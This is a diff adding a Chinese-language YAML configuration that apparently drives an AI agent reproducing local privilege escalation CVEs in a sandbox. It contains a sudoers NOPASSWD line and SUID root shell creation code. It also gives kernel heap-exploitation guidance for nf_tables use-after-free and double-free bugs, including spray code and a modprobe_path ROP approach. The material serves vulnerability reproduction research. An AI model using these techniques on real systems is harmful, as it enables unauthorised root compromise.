@@ -1,0 +1,415 @@
+# CVE 复现 — 本地提权（OS 层屏障）
+target_type: local_privilege_escalation
+label: "本地提权"
+attack_surface: local
+
+# 推荐的 exploit 模块（Agent 优先使用，不强制）
+recommended_modules:
+  deploy:
+    - "exploit_modules/application/deploy/service_user.py"
+  forge: []
+
+# 容器运行时配置（框架读取，不依赖 agent）
+container:
+  entrypoint_mode: "sleep"
+  requires_startup: false
+
+type_instruction: |
+  【本地提权模式】用户选择 LPE 目标。目标是通过漏洞机制从非 root 用户
+  提升到 root。必须按能力递进链逐层验证：信息泄露 → 代码执行 → 本地提权。
+  验收标准：非 root 用户运行一条命令后落入 root shell。
+
+acceptance: |
+  ## LPE 漏洞通用验收标准
+
+  LPE（本地提权）漏洞复现必须达到：**用户以非 root 身份运行一条命令，自动落在一个 root shell 里**。中间不需要任何手动操作。
+
+  **通用步骤：**
+  1. 创建 attacker 用户并立即配置 sudoers（两个操作必须连续执行，不可跳过）：
+     ```bash
+     # 创建用户
+     useradd -m attacker
+     echo 'attacker:exppilot' | chpasswd
+     # 立即配 sudoers（必须！遗漏会导致 verify.sh 卡死在密码输入）
+     echo "attacker ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
+     # 验证 sudoers 生效
+     sudo -u attacker sudo -n true 2>/dev/null || echo "⚠ sudoers 验证失败"
+     ```
+     `ALL` 意味着 attacker 可以 sudo 执行任何命令（QEMU VM 隔离沙盒内安全），
+     避免了某些 LPE 无特定触发命令时 agent 跳过 sudoers 配置的问题。
+     🚨 **不配 sudoers = 违规**：attacker 没有 NOPASSWD，verify.sh 执行到 sudo 时会卡死。
+  2. 恶意 payload 负责生成 suid shell（具体利用方式由 CVE 决定，常见模式包括：环境变量注入、恶意模块加载、竞态条件利用等）。suid shell 生成代码：
+     ```python
+     import shutil, os
+     shutil.copy('/bin/bash', '/tmp/rootshell')
+     os.chmod('/tmp/rootshell', 0o4755)
+     ```
+  3. verify 脚本由 attacker 运行，分三阶段：
+     - [1/3] 设置陷阱（创建恶意文件、启动 attacker 进程、设置利用所需的环境变量）
+     - [2/3] 触发漏洞（sudo 运行触发命令，恶意代码以 root 生成 suid shell）
+     - [3/3] 提权完成（交互终端进 rootshell，非交互自动退出）
+  4. 脚本最后一步必须是 `[ -t 1 ] && exec /tmp/rootshell -p`
+  5. 不要在容器中全程用 root 执行——那样看不到提权效果
+
+exp_sh:
+  header: |
+    ### 1. exp.sh — 漏洞利用（攻击逻辑）
+    负责创建恶意 payload、启动攻击进程、触发漏洞。**不**做结果验证。
+    注意：对于 nf_tables UAF/DF CVE，框架已在 Phase 0 将以下工具部署到目标环境：
+    - /tmp/cc_helper.h — cross-cache Complete Free 辅助（exploit.c 中 #include）
+    - /tmp/modprobe_rop.h — modprobe_path ROP 链（可选替代 commit_creds）
+    - /tmp/expkit — 内核利用辅助工具（kallsyms / spray / complete-free）
+  sections:
+    - title: "通用规则（所有 LPE 适用）"
+      rules:
+        - "**必须能以 attacker 身份运行**。sudo **仅用于触发漏洞的提权命令**。启动进程、写文件、设置环境变量等操作不需要 sudo，直接以 attacker 身份执行"
+        - "🔴 所有 `sudo` 命令必须加 `-n` 参数（`sudo -n <命令>`）。`-n` 确保非交互模式——用户有 NOPASSWD 则正常执行，没有则失败而不是卡死在密码提示。禁止使用裸 `sudo`。清理命令用 `sudo -n rm ... 2>/dev/null || true`"
+        - "🔴 exp.sh 开头如果检测到 attacker 已有 sudo（上次 exploit 残留），必须清理干净后继续执行 exploit，不能直接退出。清理旧 sudoers：`sudo -n rm -f /etc/sudoers.d/exploit-* 2>/dev/null; sudo -n -K 2>/dev/null`"
+        - "禁止用 `su - attacker` 切换用户（因为脚本本身就是 attacker 运行的），也禁止假设当前是 root"
+        - "不使用 `set -e`，清理命令加 `2>/dev/null || true`"
+        - "所有临时文件写入独立目录 `/tmp/lpe_exp_$$/`（避免 root 残留文件权限冲突）"
+        - "触发命令需过滤噪声：用 `2>/dev/null` 或 `grep -v` 屏蔽工具调试输出，只保留关键信息"
+        - "**禁止裸运行 exploit**：exploit 可能调用 `exec su` 等交互式命令导致卡死。始终用 `echo 'exppilot' | timeout 30 ./exploit` 或 `./exploit < /dev/null` 包装，禁止直接 `./exploit`"
+        - "输出以 `EXP 完成` 结尾"
+    - title: "nf_tables 跨 cache CVE 专用规则"
+      rules:
+        - "**exploit.c 必须 include 框架提供的工具头文件**：
+           `#include \"/tmp/cc_helper.h\"`
+           `#include \"/tmp/modprobe_rop.h\"`（可选）"
+        - "**编译命令必须加 `-I/tmp`**：
+           `gcc -O2 -o exploit exploit.c -I/tmp -I/usr/include/libnl3 -lnl-3 -lnl-nf-3 -lmnl -lpthread -no-pie -s`"
+        - "**create_ct_expect_obj 签名**：必须实现 5 参数版本
+           `static int create_ct_expect_obj(struct nl_sock *sock, const char *tname,
+                                            const char *oname, const char *udata, int udata_len)`"
+        - "**exploit 中对于双 free 的利用，必须先跑 Complete Free**：
+           ```c
+           // 1. 初始化 cc_context（spray_size = 目标 kmalloc bucket 大小）
+           struct cc_context *ctx = cc_init(sock, \"kmalloc-256\", \"kmalloc-cg-256\", 216);
+           ctx->reclaim_udata_size = 88;  // 216-128=88 → ct_expect 落在 kmalloc-cg-256
+
+           // 2. Complete Free：填满 kmalloc-256 → 释放回 buddy → 用 kmalloc-cg-256 回收
+           cc_spray_src(ctx);
+           usleep(20000);
+           cc_drain_src(ctx);
+           usleep(100000);
+           cc_reclaim_dst(ctx, OBJ_TABLE, NFT_OBJECT_CT_EXPECT);
+
+           // 3. 然后才触发漏洞（double-free 现在在 kmalloc-cg-* 内同 cache）
+           // ... pipapo set + insert + flush 等原有代码 ...
+           ```"
+
+agent_rules:
+  - title: "🔴 LPE 专用 Agent 规则（编译/运行阶段）"
+    rules:
+      - "**docker_run 必须传 user=\"attacker\"**：运行 exploit/exp.sh 时必须以 attacker 身份，不能以 root 运行。docker_run 工具的 user 参数直接对应 docker exec -u"
+      - "**先查再跑**：运行 exploit 前先用 `docker_run(user=\"attacker\", command=\"whoami\")` 确认当前身份是 attacker"
+      - "**timeout 防挂**：exploit 可能挂起（等待输入、死循环、su 密码提示等），docker_run 必须设 timeout=60 或更短"
+      - "**输出检查**：运行 exploit 后检查输出是否包含 `uid=0 euid=0` → 说明以 root 运行了，必须改用 user=\"attacker\" 重跑"
+      - "**僵尸清理**：重试前先清理残留进程，`pkill -9 -f exploit名 2>/dev/null || true`，或用 `kill -9 \\$(pgrep -f exploit名) 2>/dev/null || true`"
+      - "**禁止直接 docker exec / su**：必须用 docker_run 工具，它有超时保护和 user 参数"
+
+  - title: "🔴 跨 cache UAF/DF CVE（如 CVE-2023-4004）专用规则"
+    rules:
+      - "**禁止从零手写 exploit.c**：框架已在 Phase 0 将 /tmp/exp_skeleton.c 部署到目标环境。
+         必须 `cat /tmp/exp_skeleton.c > exploit.c`，然后只修改 === CVE TRIGGER === 区域。
+         骨架已包含 cc_helper.h、Complete Free、shellcode、netlink helpers，不需要重写"
+      - "**禁止在两次 flush 之间 insert**：正确流程: insert → flush → spray → flush。
+         错误流程: insert → flush → spray → insert → flush ✗（这不会触发 double-free）"
+      - "**禁止使用 msg_msg 做 spray**：msg_msg 在 kmalloc-*（non-accounted），
+         nf_tables pipapo 在 kmalloc-cg-*（accounted），两个 cache 族互不重叠。
+         必须用 cc_helper.h 的 ct_expect + userdata 做 spray（kmalloc-cg-*）"
+      - "**必须先做 Complete Free 对齐 cache**：
+         调用 `cc_spray_src()` → `cc_drain_src()` → `cc_reclaim_dst()` 做跨 cache 整页迁移"
+      - "**create_ct_expect_obj 必须支持 5 参数**：函数签名必须为
+         `static int create_ct_expect_obj(struct nl_sock *sock, const char *tname,
+                                          const char *oname, const char *udata, int udata_len)`
+         udata=NULL / udata_len=0 时等于旧版 3 参数行为"
+      - "**编译命令必须加 `-I/tmp`**：`gcc -O2 -o exploit exploit.c -I/tmp -I/usr/include/libnl3
+         -lnl-3 -lnl-nf-3 -lmnl -lpthread -no-pie -s`
+         不加 -I/tmp 会导致 `#include \"/tmp/cc_helper.h\"` 找不到文件"
+      - "**cc_init 后必须设置 reclaim_udata_size**：
+         `ctx->reclaim_udata_size = spray_size - 128;`（nft_object 约 128 字节）。
+         使 reclaim 的 ct_expect 落在与释放元素相同的 kmalloc-cg-* bucket"
+      - "**优先考虑 modprobe_path ROP**：用 `#include \"/tmp/modprobe_rop.h\"`
+         和 `build_modprobe_rop()` 构建 ROP 链改写 modprobe_path。不需要 ops 指针 leak，
+         只需从 kallsyms 解析 strncpy_from_user 地址 "
+
+verify_sh:
+  header: |
+    ### 2. verify.sh — 一键验证脚本
+    运行 exp.sh 并检查结果。可反复运行。
+    注意：bash 中 `EUID`、`UID` 是只读变量，不能用它们做自定义变量名（改用 ROOT_UID、TARGET_EUID 等）。
+  sections:
+    - title: "开头 — 运行 exp.sh"
+      text: "运行 exp.sh: `bash /tmp/exp.sh`"
+    - title: "开头 — 拒绝 root + 展示身份"
+      code: |
+        if [ "$(id -u)" -eq 0 ]; then
+            echo "❌ 请以非 root 用户运行此脚本"
+            echo "   用法: docker exec -it -u attacker <容器名> bash /tmp/verify.sh"
+            exit 1
+        fi
+        echo "[Before] whoami=$(whoami), uid=$(id -u)"
+        echo "[Before] sudo: $(sudo -n true 2>/dev/null && echo '✅ root' || echo '❌ 被拒')"
+        echo "[Before] 写 /root/: $(touch /root/test 2>/dev/null && echo '✅' || echo '❌ 被拒')"
+        rm -f /root/test 2>/dev/null || true
+    - title: "结尾 — root shell 提权验证"
+      text: |
+        脚本最后一行必须是 `[ -t 1 ] && exec /tmp/rootshell -p`。
+        LPE 只能以 SUID rootshell 验证——写入 sudoers 不是合法验证方式，
+        因为 sudoers 会永久修改系统配置，且后续重跑时无法区分是 exploit 提权还是已存在的权限。
+        exp.sh 的 payload 必须以 root 身份创建 /tmp/rootshell（cp /bin/bash + chmod 4755）。
+      code: |
+        echo ""
+        echo "━━━ 提权验证 ━━━"
+
+        if [ ! -f /tmp/rootshell ]; then
+            echo "❌ /tmp/rootshell 不存在 — payload 未生成 SUID root shell"
+            echo "📋 影响说明: 见上方具体原因"
+            exit 1
+        fi
+        if [ ! -u /tmp/rootshell ]; then
+            echo "❌ /tmp/rootshell SUID 位未设置"
+            exit 1
+        fi
+        echo "[Rootshell 所有者] $(ls -l /tmp/rootshell | awk '{print $3, $4, $1}')"
+        echo "  ↑ owner 必须是 root，权限 -rwsr-xr-x"
+
+        AFTER_WHOAMI=$(/tmp/rootshell -p -c 'whoami')
+        AFTER_UID=$(/tmp/rootshell -p -c 'id -u')
+        echo "[After] whoami=$AFTER_WHOAMI"
+        echo "[After] uid=$AFTER_UID"
+
+        if [ "$AFTER_UID" = "0" ]; then
+            echo ""
+            echo "LPE_RESULT=SUCCESS"
+            echo "✅ 提权成功！"
+            [ -t 1 ] && exec /tmp/rootshell -p
+        else
+            echo "❌ /tmp/rootshell 不是 root 权限"
+            exit 1
+        fi
+  skeleton: |
+    #!/bin/sh
+
+    # [COMPLIANCE CHECK: user_handling]
+    if [ "$(id -u)" -eq 0 ]; then
+        if id attacker > /dev/null 2>&1; then
+            exec su attacker -c "bash /tmp/verify.sh"
+        fi
+        echo "❌ 请以非 root 用户运行此脚本"
+        echo "   用法: docker exec -it -u attacker <容器名> bash /tmp/verify.sh"
+        exit 1
+    fi
+
+    echo "[Before] whoami=$(whoami), uid=$(id -u)"
+
+    # [COMPLIANCE CHECK: precondition]
+    echo "━━━ [前置检查] 服务可用性 ━━━"
+
+    # 自动启动（Agent 替换 __START_CMD__ 后生效，未替换则跳过）
+    if ! curl -sf http://127.0.0.1:__PORT__/__HEALTH__ > /dev/null 2>&1; then
+        if [ "__START_CMD__" != "__START_CMD__" ]; then
+            echo "  ⚠️ 服务未运行，正在自动启动..."
+            nohup sh -c "__START_CMD__" > /tmp/server.log 2>&1 &
+            sleep 5
+        fi
+    fi
+
+    for i in $(seq 1 15); do
+        if curl -sf http://127.0.0.1:__PORT__/__HEALTH__ > /dev/null 2>&1; then
+            echo "  ✅ 服务就绪"
+            break
+        fi
+        sleep 2
+        [ "$i" -eq 15 ] && echo "  ❌ 服务不可达" && exit 1
+    done
+
+    # [COMPLIANCE CHECK: exec_exp]
+    echo "━━━ 运行 exp.sh ━━━"
+    bash /tmp/exp.sh
+
+    # [COMPLIANCE CHECK: evidence_check]
+    echo ""
+    if [ ! -f /tmp/rootshell ]; then
+        echo "❌ /tmp/rootshell 不存在"
+        exit 1
+    fi
+    if [ ! -u /tmp/rootshell ]; then
+        echo "❌ /tmp/rootshell SUID 位未设置"
+        exit 1
+    fi
+    AFTER_UID=$(/tmp/rootshell -p -c 'id -u')
+    if [ "$AFTER_UID" = "0" ]; then
+        echo "LPE_RESULT=SUCCESS"
+        echo "✅ 提权成功"
+    else
+        echo "❌ /tmp/rootshell 不是 root 权限"
+        exit 1
+    fi
+
+    # [COMPLIANCE CHECK: end_marker]
+    [ -t 1 ] && exec /tmp/rootshell -p
+  end_marker: "[ -t 1 ] && exec /tmp/rootshell -p"
+
+files:
+  - name: exp.sh
+    desc: "漏洞利用（攻击逻辑）"
+    category: exploit
+    end_marker: "EXP 完成"
+    rules:
+      - "**必须能以 attacker 身份运行**。sudo 仅用于触发漏洞的提权命令。启动进程、写文件等操作不需要 sudo，直接以 attacker 身份执行"
+      - "🔴 所有 `sudo` 命令必须加 `-n` 参数，禁止使用裸 `sudo`（`sudo -n rm ... 2>/dev/null || true`）"
+      - "禁止用 `su - attacker` 切换用户（因为脚本本身就是 attacker 运行的），也禁止假设当前是 root"
+      - "不使用 `set -e`，清理命令加 `2>/dev/null || true`"
+      - "所有临时文件写入独立目录 `/tmp/lpe_exp_$$/`（避免 root 残留文件权限冲突）"
+      - "触发命令需过滤噪声：用 2>/dev/null 或 grep -v 屏蔽工具调试输出"
+      - "🔴 **nf_tables 跨 cache CVE（如 CVE-2023-4004）额外规则**：
+           exploit.c 必须 `#include \"/tmp/cc_helper.h\"`，编译命令加 `-I/tmp`；
+           create_ct_expect_obj 必须支持 5 参数（udata/udata_len）；
+           exploit 中先用 cc_spray_src→cc_drain_src→cc_reclaim_dst 做 Complete Free"
+      - "输出以 `EXP 完成` 结尾"
+
+  - name: verify.sh
+    desc: "验证脚本"
+    category: verify
+    end_marker: "[ -t 1 ] && exec /tmp/rootshell -p"
+    rules:
+      - "开头必须包含 root 检测 (id -u)，如果为 root 则 echo 错误并 exit 1"
+      - "开头展示 [Before] 身份：whoami, uid, 无法写入 /root/"
+      - "exp.sh 的 payload 必须以 root 身份创建 /tmp/rootshell（cp /bin/bash + chmod 4755）"
+      - "验证 SUID rootshell：检测 /tmp/rootshell 存在且有 SUID 位"
+      - "/tmp/rootshell -p -c whoami 输出必须是 root"
+      - "最后一行必须是 [ -t 1 ] && exec /tmp/rootshell -p"
+
+inject_on_write:
+  verify.sh:
+    pre_check: |
+      🔴 你即将写入 verify.sh。目标类型: local_privilege_escalation。写入前必须确认：
+
+      1. 🔴 开头必须包含 root 检测：if [ "$(id -u)" -eq 0 ]; then echo "❌ 请以非 root 用户运行" && exit 1; fi
+      2. 展示 [Before] 身份：whoami、uid、无法写入 /root/ 的证明
+      3. 运行 bash /tmp/exp.sh
+      4. 🔴 展示 [Rootshell 所有者]：ls -l /tmp/rootshell 显示 owner 和 SUID 位。owner 必须是 root，权限必须是 -rwsr-xr-x。
+         如果 owner 是 attacker → 假阳性，立即重写 exp.sh
+      5. 展示 [After] 身份：用 /tmp/rootshell -p -c 执行 whoami 和 id -u
+      6. 🔴 禁止使用 bash 只读变量名（EUID、UID、PPID 等）作为自定义变量
+      7. 🔴 只以 SUID rootshell 验证提权，不写 sudoers
+      8. rootshell 成功 → [ -t 1 ] && exec /tmp/rootshell -p
+      9. 不使用 set -e
+
+    post_check: |
+      🔴 verify.sh 写入完成。现在立即 read_file 读回该文件，逐条自检：
+
+      1. 开头是否有 root 检测（id -u == 0 → exit 1）？□
+         → 如果没有 → 用 write_file 重写
+      2. 是否有 [Before] 身份展示（whoami + uid + 无法写入 /root/）？□
+         → 如果缺少 → 用 write_file 重写
+      3. 是否有 [Rootshell 所有者] 展示（ls -l /tmp/rootshell 显示 owner）？□
+         → 如果缺少 → 用 write_file 重写
+         → owner 必须是 root 或其他非 attacker 用户，如果是 attacker → exp.sh 有假 SUID fallback，回去改 exp.sh
+      4. 是否有 [After] 身份展示（/tmp/rootshell -p -c whoami/id）？□
+         → 如果缺少 → 用 write_file 重写
+      5. 🔴 是否只通过 SUID rootshell 验证（没有 sudo 提权检查）？□
+         → 如果还有 sudo 提权检查 → 删除 sudo -n true 和 exec sudo -i 相关代码，用 write_file 重写
+      6. 是否有 EUID/UID/PPID 等只读变量名作为自定义变量？□（grep -E '\b(EUID|UID|PPID)='）
+         → 如果有 → 改为 ROOT_EUID 等非只读名，用 write_file 重写
+      7. 是否有 set -e？□
+         → 如果有 → 删除，用 write_file 重写
+      8. 是否无条件信任 /tmp/rootshell 存在（仅检查 SUID 位而不验证 exploit 输出）？□
+         → 必须在 exploit 输出中确认成功标记（如 "I am root" 或 "uid=0"），
+           不能只检测文件 SUID 位就认为提权成功。如果缺失 → 用 write_file 重写
+      9. 🔴 end_marker 是否严格等于 [ -t 1 ] && exec /tmp/rootshell -p？□
+         → 如果有 || echo 或 exec sudo -i → 删除，用 write_file 重写
+
+      🔴 任一 □ 打叉 → 立即重写。全部通过后才能继续下一步。
+
+      7. `bash -n` 语法检查是否通过？□
+         → 如果不通过 → 修正语法错误，用 write_file 重写
+
+  exp.sh:
+    pre_check: |
+      🔴 你即将写入 exp.sh。目标类型: local_privilege_escalation。写入前必须确认：
+
+      1. 🔴 必须以 attacker 身份运行。sudo 仅用于触发漏洞的提权命令，写文件/设置环境等操作不需要 sudo
+      2. 🔴 禁止用 su - attacker 切换用户
+      3. 不使用 set -e，清理命令加 2>/dev/null || true
+      4. 所有临时文件写入独立目录 /tmp/lpe_exp_$$/
+      5. 触发命令需过滤噪声（2>/dev/null 或 grep -v）
+      6. 🔴 禁止裸运行 exploit：用 echo 'exppilot' | timeout 30 ./exploit 或 ./exploit < /dev/null 包装
+      7. 🔴 禁止在 exp.sh 中无条件创建 SUID bash（cp /bin/bash /tmp/rootshell; chmod 4755）。
+      8. 🔴 如果是竞态（race condition）CVE：禁止纯 sleep + kill 循环。
+         使用 C/Python 高速轮询或 pidfd/inotify 信号驱动方法，命中率远高于随机 sleep
+      9. 🔴 rootshell 必须由 exploit payload 创建，exploit 失败时不能手动 fallback
+      10. 🔴 如果是 nf_tables 跨 cache UAF/DF（如 CVE-2023-4004）：
+          - exploit.c 必须 `#include "/tmp/cc_helper.h"`
+          - 编译命令必须加 `-I/tmp`
+          - create_ct_expect_obj 必须支持 5 参数（含 udata/udata_len）
+          - exploit 中先用 Complete Free（cc_spray_src→cc_drain_src→cc_reclaim_dst）做跨 cache 对齐
+      11. 最后一行输出严格等于 EXP 完成
+
+    post_check: |
+      🔴 exp.sh 写入完成。现在立即 read_file 读回该文件，逐条自检：
+
+      1. 是否包含 su - attacker？□
+         → 如果有 → 删除，用 write_file 重写
+      2. 是否对非触发命令使用了 sudo？□
+         → 如果有 → 删除多余 sudo，用 write_file 重写
+      3. 是否有 set -e？□
+         → 如果有 → 删除，用 write_file 重写
+      4. 临时文件是否写入 /tmp/lpe_exp_$$/？□
+         → 如果不是 → 用 write_file 重写
+      5. exploit 是否有 timeout 或 < /dev/null 包装？□
+         → 如果没有 → 用 write_file 重写
+      6. 最后一行是否严格等于 EXP 完成？□
+         → 如果不是 → 用 write_file 重写
+      7. 最后一行是否用 echo 输出（非裸文本）？□
+         → 如果是裸文本 EXP 完成 而非 echo "EXP 完成" → 改为 echo 包装，用 write_file 重写
+      8. 是否在 exploit 失败时手动 cp /bin/bash /tmp/rootshell 作为 fallback？□（grep "cp.*bash.*rootshell"）
+         → 如果存在且不在 exploit 成功条件分支内 → 删除该 fallback，用 write_file 重写
+      9. 如果是竞态漏洞，是否用了信号驱动/高速轮询方法（pidfd/inotify/C 循环）而非纯 sleep + kill？□
+         → 如果只有 sleep + kill 循环 → 改用高速轮询方法，用 write_file 重写
+      10. 如果是 nf_tables 跨 cache CVE：
+          □ exploit.c 是否来自 /tmp/exp_skeleton.c？（grep 'exp_skeleton\|cc_spray_src\|do_complete_free'）
+            → 如果都不是 → 用 write_file 重写，`cat /tmp/exp_skeleton.c > exploit.c` 并用骨架
+          □ exploit.c 是否 `#include "/tmp/cc_helper.h"`？（grep '#include.*cc_helper'）
+            → 如果没有 → 用 write_file 重写，补上 include
+          □ 编译命令是否含 `-I/tmp`？（grep '\-I/tmp'）
+            → 如果没有 → 用 write_file 重写，加 -I/tmp
+          □ create_ct_expect_obj 是否 5 参数？（grep -E 'create_ct_expect_obj.*,.*,.*,.*,')
+            → 如果不是 → 用 write_file 重写，补全 udata/udata_len 参数
+          □ exploit.c 是否调用了 cc_spray_src / cc_drain_src / cc_reclaim_dst？
+            → 如果没有 → 用 write_file 重写 exploit.c，加上 Complete Free
+          □ 两次 flush 之间是否有 insert？（grep -zE 'flush.*insert.*flush'）
+            → 如果有 → 删除中间的 insert，用 write_file 重写
+          □ 是否使用 msg_msg 做 spray？（grep 'msg_msg\|msgsnd\|msgget\|MSG_SZ'）
+            → 如果有 → 删除 msg_msg 代码，改用 ct_expect + cc_helper.h
+
+      🔴 任一 □ 打叉 → 立即重写。全部通过后才能继续下一步。
+
+      7. `bash -n` 语法检查是否通过？□
+         → 如果不通过 → 修正语法错误，用 write_file 重写
+
+      10. exp.sh 开头是否清理了 CVE_WORKDIR 工作空间？□
+         → 如果没有 → 在开头加 rm -rf "$CVE_WORKDIR" && mkdir -p "$CVE_WORKDIR"，用 write_file 重写
+      11. 如果 exp.sh 包含编译命令（go build/gcc/mvn），是否用 background=True 启动而非 timeout 等待？□
+         → 如果是同步编译 → 改为 background=True 启动 + 轮询检查二进制
+checks:
+  - name: "exp.sh 能以 attacker 身份运行（sudo 仅用于触发命令，不包装 Python 进程/其他操作），无 set -e，使用独立临时目录，触发命令过滤了工具噪声"
+    on_fail: "删除多余 sudo/setsid 包装器（sudo 仅用于触发命令），删除 set -e，用 `/tmp/lpe_exp_$$/` 隔离文件，过滤噪声"
+  - name: "verify.sh 开头包含 root 检测 (id -u) 且失败时 exit 1"
+    on_fail: "用 write_file 重写 verify.sh，补上 root 检测和 [Before] 身份展示"
+  - name: "verify.sh 输出包含 [Before] 和 [After] 身份对比"
+    on_fail: "补充 echo 语句展示 whoami/id 的前后变化"
+  - name: "verify.sh 未使用 bash 只读变量名（EUID, UID, PPID 等）作为自定义变量"
+    on_fail: "将 `EUID=` 改为 `ROOT_EUID=` 或其他非只读变量名"
+  - name: "verify.sh 最后一行是 [ -t 1 ] && exec /tmp/rootshell -p（纯 rootshell，不含 sudo 备选）"
+    on_fail: "删除 sudo -i/exit 0 等备选路径，确保 [ -t 1 ] && exec /tmp/rootshell -p 是唯一结尾"
+  - name: "verify.sh 不检查 sudo -n true（rootshell 是唯一验证方式）"
+    on_fail: "删除所有 sudo -n true / sudo -i 相关代码，SUID rootshell 是 LPE 的唯一合法验证方式"
+
+readme_chapters:
+  - name: "快速验证"
+    desc: "提供两种运行方式。🔴 所有 docker exec 命令必须带 -it 标志——verify.sh 末尾 [ -t 1 ] && exec /tmp/rootshell -p 需要 TTY 接管终端，不带 -it 会导致立即退出。示例: docker exec -it -u attacker <容器> bash /tmp/verify.sh。附带预期输出。"
+  - name: "手动分步验证"
+    desc: "≥5 步，每步可复制命令和预期输出，全程以 attacker 身份在容器内操作"
